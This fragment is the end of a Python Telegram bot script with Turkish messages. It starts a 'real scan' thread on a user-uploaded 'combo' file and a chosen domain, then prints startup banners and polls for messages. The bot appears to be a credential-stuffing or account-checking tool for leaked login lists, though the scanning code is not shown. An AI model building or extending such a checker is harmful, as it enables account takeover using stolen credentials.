    bot.send_message(message.chat.id, "🚀 Tarama Başladı!\nCombo dosyanız işleniyor...", parse_mode='HTML')
    
    threading.Thread(target=start_real_scan, args=(user_id, file_path, message.chat.id, scan_mode, custom_domain)).start()

# ==================== BOTU CALISTIR ====================
print(Fore.GREEN + f"[+] {yazi(lang, 'baslik')} calisiyor...")
print(Fore.CYAN + f"👑 {MY_SIGNATURE}")
print(Fore.YELLOW + f"📊 SQLite Veritabanı aktif")
print(Fore.RED + "⚊" * 50)
bot.infinity_polling()